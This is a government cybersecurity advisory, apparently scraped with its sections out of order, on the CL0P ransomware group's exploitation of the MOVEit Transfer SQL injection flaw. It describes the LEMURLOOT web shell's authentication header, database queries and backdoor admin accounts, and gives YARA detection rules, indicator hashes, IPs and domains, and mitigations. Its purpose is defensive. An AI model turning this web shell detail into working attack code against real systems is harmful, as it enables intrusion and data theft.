Truebot is a first-stage downloader module that can collect system information and take screenshots [T1113], developed and attributed to the Silence hacking group. After connecting to the C2 infrastructure, Truebot can be instructed to load shell code [T1055] or DLLs [T1574.002], download additional modules [T1129], run them, or delete itself [T1070]. In the case of TA505, Truebot has been used to download FlawedGrace or Cobalt Strike beacons.
Cobalt Strike is used to expand network access after gaining access to the Active Directory (AD) server [T1018].
DEWMODE is a web shell written in PHP designed to target Accellion FTA devices and interact with the underlying MySQL database and is used to steal data from the compromised device [1505.003].
LEMURLOOT is a web shell written in C# designed to target the MOVEit Transfer platform. The web shell authenticates incoming http requests via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create, insert, or delete a particular user. When responding to the request, the web shell returns data in a gzip compressed format.

CVE-2023-34362 MOVEIT TRANSFER VULNERABILITY
MOVEit is typically used to manage an organization’s file transfer operations and has a web application that supports MySQL, Microsoft SQL Server, and Azure SQL database engines. In May 2023, the CL0P ransomware group exploited a SQL injection zero-day vulnerability CVE-2023-34362 to install a web shell named LEMURLOOT on MOVEit Transfer web applications [T1190] [1]. Lemurloot was used as a method of persistence, information gathering and data stealing in CVE-2023-34362. The webshell imports multiple libraries including “MOVEit.DMZ.ClassLib,” “MOVEit.DMZ.Application.Files,” and “MOVEit.DMZ.Application.Users” to interact with MOVEit managed file transfer software. The web shell was initially observed with the name human2.aspx in an effort to masquerade as the legitimate human.aspx file present as part of MOVEit Transfer software. Upon installation, the web shell creates a random 36 character password to be used for authentication. The web shell interacts with its operators by awaiting HTTP requests containing a header field named X-siLock-Comment, which must have a value assigned equal to the password established upon the installation of the web shell. After authenticating with the web shell, operators pass commands to the web shell that can:

Retrieve Microsoft Azure system settings, Azure Blob Storage, Azure Blob Storage account, Azure Blob key, and Azure Blob Container using the following query:

“select f.id, f.instid, f.folderid, filesize, f.Name as Name, u.LoginName as uploader, fr.FolderPath , fr.name as fname from folders fr, files f left join users u on f.UploadUsername = u.Username where f.FolderID = fr.ID” (Figure 2).


Enumerate the underlying SQL database.
Store a string sent by the operator and then retrieve a file with a name matching the string from the MOVEit Transfer system.
Create a new administrator privileged account with a randomly generated username and LoginName and RealName values set to “Health Check Service.”
Delete an account with LoginName and RealName values set to ‘Health Check Service.’


 

Figure 2 – Lemurloot webshell code that interacts with Azure

Progress Software announced the discovery of CVE-2023-34362 MOVEit Transfer vulnerability and issued guidance on known affected versions, software upgrades, and patching. Based on evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog on June 2, 2023. This MOVEit Transfer critical vulnerability exploit impacts the following versions of the software [2]:

MOVEit Transfer 2023.0.0
MOVEit Transfer 2022.1.x
MOVEit Transfer 2022.0.x
MOVEit Transfer 2021.1.x
MOVEit Transfer 2021.0.x
MOVEit Transfer 2020.1.x
MOVEit Transfer 2020.0.x

Due to the speed and ease TA505 has exploited this vulnerability, and based on their past campaigns, FBI and CISA expect to see widespread exploitation of unpatched software services in both private and public networks. For IOCs related to the MOVEit campaign, see table 2.
DETECTION METHODS
Below, are open source deployable YARA rules that may be used to detect malicious activity of the MOVEit Transfer Zero Day Vulnerability. For more information, visit GitHub or the resource section of this CSA. [1] [3]:



rule CISA_10450442_01 : LEMURLOOT webshell communicates_with_c2 remote_access{   meta:       Author = ""CISA Code & Media Analysis""       Incident = ""10450442""       Date = ""2023-06-07""       Last_Modified = ""20230609_1200""       Actor = ""n/a""       Family = ""LEMURLOOT""       Capabilities = ""communicates-with-c2""       Malware_Type = ""webshell""       Tool_Type = ""remote-access""       Description = ""Detects ASPX webshell samples""       SHA256_1 = ""3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b""   strings:       $s1 = { 4d 4f 56 45 69 74 2e 44 4d 5a }       $s2 = { 25 40 20 50 61 67 65 20 4c 61 6e 67 75 61 67 65 3d }       $s3 = { 4d 79 53 51 4c }       $s4 = { 41 7a 75 72 65 }       $s5 = { 58 2d 73 69 4c 6f 63 6b 2d }   condition:       all of them}



 



rule M_Webshell_LEMURLOOT_DLL_1 {    meta:        disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment""        description = ""Detects the compiled DLLs generated from human2.aspx LEMURLOOT payloads.""        sample = ""c58c2c2ea608c83fad9326055a8271d47d8246dc9cb401e420c0971c67e19cbf""        date = ""2023/06/01""        version = ""1""    strings:        $net = ""ASP.NET""        $human = ""Create_ASP_human2_aspx""        $s1 = ""X-siLock-Comment"" wide        $s2 = ""X-siLock-Step3"" wide        $s3 = ""X-siLock-Step2"" wide        $s4 = ""Health Check Service"" wide        $s5 = ""attachment; filename={0}"" wide    condition:        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and        filesize < 15KB and        $net and        (            ($human and 2 of ($s*)) or            (3 of ($s*))        )}



 



rule M_Webshell_LEMURLOOT_1 {    meta:        disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment""        description = ""Detects the LEMURLOOT ASP.NET scripts""        md5 = ""b69e23cd45c8ac71652737ef44e15a34""        sample = ""cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x""        date = ""2023/06/01""        version = ""1""    strings:        $head = ""<%@ Page""        $s1 = ""X-siLock-Comment""        $s2 = ""X-siLock-Step""        $s3 = ""Health Check Service""        $s4 = /pass, \""[a-z0-9]{8}-[a-z0-9]{4}/        $s5 = ""attachment;filename={0}""    condition:        filesize > 5KB and filesize < 10KB and        (            ($head in (0..50) and 2 of ($s*)) or            (3 of ($s*))        )}



 




rule MOVEit_Transfer_exploit_webshell_aspx {
    meta:
        date = ""2023-06-01""        description = ""Detects indicators of compromise in MOVEit Transfer exploitation.""        author = ""Ahmet Payaslioglu - Binalyze DFIR Lab""        hash1 = ""44d8e68c7c4e04ed3adacb5a88450552""        hash2 = ""a85299f78ab5dd05e7f0f11ecea165ea""        reference1 = ""https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/""        reference2 = ""https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/""        reference3 = ""https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643""        verdict = ""dangerous""          mitre = ""T1505.003""        platform = ""windows""        search_context = ""filesystem""            strings:        $a1 = ""MOVEit.DMZ""        $a2 = ""Request.Headers[\""X-siLock-Comment\""]""        $a3 = ""Delete FROM users WHERE RealName='Health Check Service'""        $a4 = ""set[\""Username\""]""        $a5 = ""INSERT INTO users (Username, LoginName, InstID, Permission, RealName""        $a6 = ""Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create()""        $a7 = ""Response.StatusCode = 404;""    condition:                filesize < 10KB        and all of them }
rule MOVEit_Transfer_exploit_webshell_dll {
    meta:
        date = ""2023-06-01""        description = ""Detects indicators of compromise in MOVEit Transfer exploitation.""        author = ""Djordje Lukic - Binalyze DFIR Lab""        hash1 = ""7d7349e51a9bdcdd8b5daeeefe6772b5""        hash2 = ""2387be2afe2250c20d4e7a8c185be8d9""        reference1 = ""https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/""        reference2 = ""https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/""        reference3 = ""https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643""        verdict = ""dangerous""          mitre = ""T1505.003""        platform = ""windows""        search_context = ""filesystem""            strings:        $a1 = ""human2.aspx"" wide        $a2 = ""Delete FROM users WHERE RealName='Health Check Service'"" wide        $a3 = ""X-siLock-Comment"" wide    condition:                uint16(0) == 0x5A4D and filesize < 20KB        and all of them }




If a victim rebuilds the web server but leaves the database intact, the CL0P user accounts will still exist and can be used for persistent access to the system.
Victims can use the following SQL query to audit for active administrative accounts, and should validate that only intended accounts are present.
SELECT * FROM [<database name>].[dbo].[users] WHERE Permission=30 AND Status='active' and Deleted='0'
MOVEit Campaign Indicators of Compromise



Files
Hash





LEMURLOOT
Web Shell
e.g. human2.aspx





0b3220b11698b1436d1d866ac07cc90018e59884e91a8cb71ef8924309f1e0e9


0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495


110e301d3b5019177728010202c8096824829c0b11bb0dc0bff55547ead18286


1826268249e1ea58275328102a5a8d158d36b4fd312009e4a2526f0bfbc30de2


2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5


2ccf7e42afd3f6bf845865c74b2e01e2046e541bb633d037b05bd1cdb296fa59


348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d


387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a


38e69f4a6d2e81f28ed2dc6df0daf31e73ea365bd2cfc90ebc31441404cca264


3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b


3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409


3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c


4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf


48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a


58ccfb603cdc4d305fddd52b84ad3f58ff554f1af4d7ef164007cb8438976166


5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff


6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d


702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0


769f77aace5eed4717c7d3142989b53bd5bac9297a6e11b2c588c3989b397e6b


7c39499dd3b0b283b242f7b7996205a9b3cf8bd5c943ef6766992204d46ec5f1


93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db


98a30c7251cf622bd4abce92ab527c3f233b817a57519c2dd2bf8e3d3ccb7db8


9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead


9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a


a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7


a8f6c1ccba662a908ef7b0cb3cc59c2d1c9e2cbbe1866937da81c4c616e68986


b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272


b5ef11d04604c9145e4fe1bedaeb52f2c2345703d52115a5bf11ea56d7fb6b03


b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad


bdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b


c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4


c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37


cec425b3383890b63f5022054c396f6d510fae436041add935cd6ce42033f621


cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45


d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899


d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195


daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4


e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e


ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a


ed0c3e75b7ac2587a5892ca951707b4e0dd9c8b18aaf8590c24720d73aa6b90c


f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d


fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f







GoAnywhere Campaign Indicators of Compromise



Files
Hash
Description




larabqFa.exeQboxdv.dll
0e3a14638456f4451fe8d76fdc04e591fba942c2f16da31857ca66293a58a4c3
Truebot


%TMP%\7ZipSfx.000\Zoom.exe 
1285aa7e6ee729be808c46c069e30a9ee9ce34287151076ba81a0bea0508ff7e
Spawns a PowerShell subprocess which executes a malicious DLL file


%TMP%\7ZipSfx.000\ANetDiag.dll
2c8d58f439c708c28ac4ad4a0e9f93046cf076fc6e5ab1088e8943c0909acbc4
Obfuscated malware which also uses long sleeps and  debug detection to evade analysis


AVICaptures.dll
a8569c78af187d603eecdc5faec860458919349eef51091893b705f466340ecd
Truebot


kpdphhajHbFerUr.exegamft.dll
c042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c
Truebot


dnSjujahur.exePxaz.dll
c9b874d54c18e895face055eeb6faa2da7965a336d70303d0bd6047bec27a29d
Truebot


7ZSfxMod_x86.exeZoomInstaller.exeZoom.exe
d5bbcaa0c3eeea17f12a5cc3dbcaffff423d00562acb694561841bcfe984a3b7
Fake Zoom installer - Truebot


update.jsp
eb9f5cbe71f9658d38fb4a7aa101ad40534c4c93ee73ef5f6886d89159b0e2c2
Java Server Pages (JSP) web shell with some base64 obfuscation


%TMP%\<folder>\extracted_at_0xe5c8f00.exe
f2f08e4f108aaffaadc3d11bad24abdd625a77e0ee9674c4541b562c78415765
Employs sandbox detection and string obfuscation - appears to be a collection of C# hack tools


UhfdkUSwkFKedUUi.exegamft.dll
ff8c8c8bfba5f2ba2f8003255949678df209dbff95e16f2f3c338cfa0fd1b885
Truebot






Email Address
Description




unlock@rsv-box[.]com
CL0P communication email


unlock@support-mult[.]com
CL0P communication email


rey14000707@gmail[.]com
Login/Download


gagnondani225@gmail[.]com
Email



 



Malicious Domain




http://hiperfdhaus[.]com


http://jirostrogud[.]com


http://qweastradoc[.]com


http://qweastradoc[.]com/gate.php


http://connectzoomdownload[.]com/download/ZoomInstaller.exe


https://connectzoomdownload[.]com/download/ZoomInstaller.exe


http://zoom[.]voyage/download/Zoom.exe


http://guerdofest[.]com/gate.php



 



Certificate Name
Status
Date Valid
Thumbprint
Serial Number




Savas Investments PTY LTD
Valid Issuer: Sectigo Public Code Signing CA R36
10/7/2022 - 10/7/2023

8DCCF6AD21A58226521
E36D7E5DBAD133331C181

00-82-D2-24-32-3E-FA-65-06-0B-64- 1F-51-FA-DF-EF-02



 




MOVEit Campaign Infrastructure
IP Addresses
May/June 2023





104.194.222[.]107


146.0.77[.]141


146.0.77[.]155


146.0.77[.]183


148.113.152[.]144


162.244.34[.]26


162.244.35[.]6


179.60.150[.]143


185.104.194[.]156


185.104.194[.]24


185.104.194[.]40


185.117.88[.]17


185.162.128[.]75


185.174.100[.]215


185.174.100[.]250


185.181.229[.]240


185.181.229[.]73


185.183.32[.]122


185.185.50[.]172


188.241.58[.]244


193.169.245[.]79


194.33.40[.]103


194.33.40[.]104


194.33.40[.1]64


198.12.76[.]214


198.27.75[.]110


206.221.182[.]106


209.127.116[.]122


209.127.4[.]22


209.222.103[.]170


45.227.253[.]133


45.227.253[.]147


45.227.253[.]50


45.227.253[.]6


45.227.253[.]82


45.56.165[.]248


5.149.248[.]68


5.149.250[.]74


5.149.250[.]92


5.188.86[.]114


5.188.86[.]250


5.188.87[.]194


5.188.87[.]226


5.188.87[.]27


5.252.23[.]116


5.252.25[.]88


5.34.180[.]205


62.112.11[.]57


62.182.82[.]19


62.182.85[.]234


66.85.26[.]215


66.85.26[.]234


66.85.26[.]248


79.141.160[.]78


79.141.160[.]83


84.234.96[.]104


84.234.96[.]31


89.39.104[.]118


89.39.105[.]108


91.202.4[.]76


91.222.174[.]95


91.229.76[.]187


93.190.142[.]131



 
Updated June 16, 2023




Fortra GoAnywhere
 High Confidence and Temporal
IP Addresses
January/June





92.118.36[.]249


5.34.180[.]48


185.33.86[.]225


148.113.159[.]213


15.235.13[.]184


82.117.252[.]141


185.80.52[.]230


91.222.174[.]68


5.34.178[.]31


185.104.194[.]134


5.34.178[.]28


185.81.113[.]156


5.34.178[.]30


77.83.197[.]66


193.42.38[.]196


209.222.98[.]25


106.75.139[.]199


79.141.166[.]119


185.117.88[.]2


79.141.160[.]78


185.33.87[.]126


82.117.252[.]142


15.235.83[.]73


81.56.49[.]148


96.44.181[.]131


192.42.116[.]191


213.121.182[.]84


104.200.72[.]149


152.57.231[.]216


142.44.212[.]178


54.39.133[.]41


76.117.196[.]3


24.3.132[.]168


166.70.47[.]90


208.115.199[.]25


216.144.248[.]20


173.254.236[.]131


3.101.53[.]11


54.184.187[.]134


100.21.161[.]34


44.206.3[.]111


75.101.131[.]237


20.47.120[.]195


198.137.247[.]10



End of Update
MITRE ATT&CK TECHNIQUES
See tables below for referenced CL0P tactics and techniques used in this advisory.

Table 1. ATT&CK Techniques for Enterprise: Initial Access


Initial Access
 
 




Technique Title
ID
Use


Exploit Public-Facing Application
T1190
CL0P ransomware group exploited the zero-day vulnerability CVE-2023-34362 affecting MOVEit Transfer software; begins with a SQL injection to infiltrate the MOVEit Transfer web application.


Phishing
T1566
CL0P actors send a large volume of spear-phishing emails to employees of an organization to gain initial access.



 

Table 2. ATT&CK Techniques for Enterprise: Execution


Execution
 
 




Technique Title
ID
Use


Command and Scripting Interpreter: PowerShell
T1059.001
CL0P actors use SDBot as a backdoor to enable other commands and functions to be executed in the compromised computer.


Command and Scripting Interpreter
T1059.003
CL0P actors use TinyMet, a small open-source Meterpreter stager to establish a reverse shell to their C2 server.


Shared Modules
T1129
CL0P actors use Truebot to download additional modules.



 

Table 3. ATT&CK Techniques for Enterprise: Persistence


Persistence
 
 




Technique Title
ID
Use


Server Software Component: Web Shell
T1505.003
DEWMODE is a web shell designed to interact with a MySQL database, and is used to exfiltrate data from the compromised network.


Event Triggered Execution: Application Shimming
T1546.011
CL0P actors use SDBot malware for application shimming for persistence and to avoid detection.



 

Table 4. ATT&CK Techniques for Enterprise: Privilege Escalation


Privilege Escalation 
 
 




Technique Title
ID
Use


Exploitation for Privilege Escalation
T1068
CL0P actors were gaining access to MOVEit Transfer databases prior to escalating privileges within compromised network.



 

Table 5. ATT&CK Techniques for Enterprise: Defense Evasion


Defense Evasion
 
 




Technique Title
ID
Use


Process Injection
T1055
CL0P actors use Truebot to load shell code.


Indicator Removal
T1070
CL0P actors delete traces of Truebot malware after it is used.


Hijack Execution Flow: DLL Side-Loading
T1574.002
CL0P actors use Truebot to side load DLLs.



 

Table 6. ATT&CK Techniques for Enterprise: Discovery


Discovery
 
 




Technique Title
ID
Use


Remote System Discovery
T1018
CL0P actors use Cobalt Strike to expand network access after gaining access to the Active Directory (AD) servers.



 

Table 7. ATT&CK Techniques for Enterprise: Lateral Movement


Lateral Movement
 
 




Technique Title
ID
Use


Remote Services: SMB/Windows Admin Shares
T1021.002
CL0P actors have been observed attempting to compromise the AD server using Server Message Block (SMB) vulnerabilities with follow-on Cobalt Strike activity.


Remote Service Session Hijacking: RDP Hijacking
T1563.002
CL0P ransomware actors have been observed using Remote Desktop Protocol (RDP) to interact with compromised systems after initial access.



 

Table 8. ATT&CK Techniques for Enterprise: Collection


Collection
 
 




Technique Title
ID
Use


Screen Capture
T1113
CL0P actors use Truebot to take screenshots in effort to collect sensitive data.



 

Table 9. ATT&CK Techniques for Enterprise: Command and Control


Command and Control
 
 




Technique Title
ID
Use


Application Layer Protocol
T1071
CL0P actors use FlawedAmmyy remote access trojan (RAT) to communicate with the Command and Control (C2).


Ingress Tool Transfer
T1105

CL0P actors are assessed to use FlawedAmmyy remote access trojan (RAT) to the download of additional malware components.
CL0P actors use SDBot to drop copies of itself in removable drives and network shares.




 

Table 10. ATT&CK Techniques for Enterprise: Exfiltration


Exfiltration
 
 




Technique Title
ID
Use


Exfiltration Over C2 Channel
T1041
CL0P actors exfiltrate data for C2 channels.



 
MITIGATIONS
The authoring agencies recommend organizations implement the mitigations below to improve their organization’s security posture in response to  threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections to reduce the risk of compromise by CL0P ransomware.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T].
Using security software to detect instances of remote access software only being loaded in memory.
Requiring authorized remote access solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Restrict the use of PowerShell, using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E].

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors: 

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least eight characters and no more than 64 characters in length [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring authorities of this CSA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REFERENCE[1] Zero-Day Vulnerability in MOVEit Transfer Exploited for Data Theft | Mandiant[2] MOVEit Transfer Critical Vulnerability (May 2023) - Progress Community[3] MOVEit Transfer Critical Vulnerability CVE-2023-34362 Rapid Response (huntress.com)
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with CL0P group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, or CISA at cisa.gov/report.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1190', 'T1068', 'T1563.002', 'T1070', 'T1105', 'T1113', 'T1018', 'T1566', 'T1021.002', 'T1055', 'T1059.003', 'T1574.002', 'T1505.003', 'T1071', 'T1059.001', 'T1546.011', 'T1129'}","






Actions to take today to mitigate cyber threats from CL0P ransomware: 




Take an inventory of assets and data, identifying authorized and unauthorized devices and software.
Grant admin privileges and access only when necessary, establishing a software allow list that only executes legitimate applications.
Monitor network ports, protocols, and services, activating security configurations on network infrastructure devices such as firewalls and routers
Regularly patch and update software and applications to their latest versions, and conduct regular vulnerability assessments.







Updated June 16, 2023
This CSA is being re-released to remove old Fortra GoAnywhere Campaign IP addresses and to add new IP addresses. See the update below.
End of Update
SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known CL0P ransomware IOCs and TTPs identified through FBI investigations as recently as June 2023.
According to open source information, beginning on May 27, 2023, CL0P Ransomware Gang, also known as TA505, began exploiting a previously unknown SQL injection vulnerability (CVE-2023-34362) in Progress Software's managed file transfer (MFT) solution known as MOVEit Transfer. Internet-facing MOVEit Transfer web applications were infected with a web shell named LEMURLOOT, which was then used to steal data from underlying MOVEit Transfer databases. In similar spates of activity, TA505 conducted zero-day-exploit-driven campaigns against Accellion File Transfer Appliance (FTA) devices in 2020 and 2021, and Fortra/Linoma GoAnywhere MFT servers in early 2023.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of CL0P ransomware and other ransomware incidents.
Download the PDF version, STIX and JSON file for this report:


AA23-158A PDF
(PDF,       740.97 KB
  )




AA23-158A STIX XML
(XML,       165.28 KB
  )




AA23-158A JSON
(JSON,       93.33 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Appearing in February 2019, and evolving from the CryptoMix ransomware variant, CL0P was leveraged as a Ransomware as a Service (RaaS) in large-scale spear-phishing campaigns that used a verified and digitally signed binary to bypass system defenses. CL0P was previously known for its use of the ‘double extortion’ tactic of stealing and encrypting victim data, refusing to restore victim access and publishing exfiltrated data on Tor via the CL0P^_-LEAKS website. In 2019, TA505 actors leveraged CL0P ransomware as the final payload of a phishing campaign involving a macro-enabled document that used a Get2 malware dropper for downloading SDBot and FlawedGrace. In recent campaigns beginning 2021, CL0P preferred to rely mostly on data exfiltration over encryption.
Beyond CL0P ransomware, TA505 is known for frequently changing malware and driving global trends in criminal malware distribution. Considered to be one of the largest phishing and malspam distributors worldwide, TA505 is estimated to have compromised more than 3,000 U.S.-based organizations and 8,000 global organizations.
TA505 has operated:

A RaaS and has acted as an affiliate of other RaaS operations,
As an initial access broker (IAB), selling access to compromised corporate networks,
As a customer of other IABs,
And as a large botnet operator specializing in financial fraud and phishing attacks.

In a campaign from 2020 to 2021, TA505 used several zero-day exploits to install a web shell named DEWMODE on internet-facing Accellion FTA servers. Similarly, the recent exploitation of MOVEit Transfer, a SQL injection vulnerability was used to install the web shell, which enabled TA505 to execute operating system commands on the infected server and steal data.
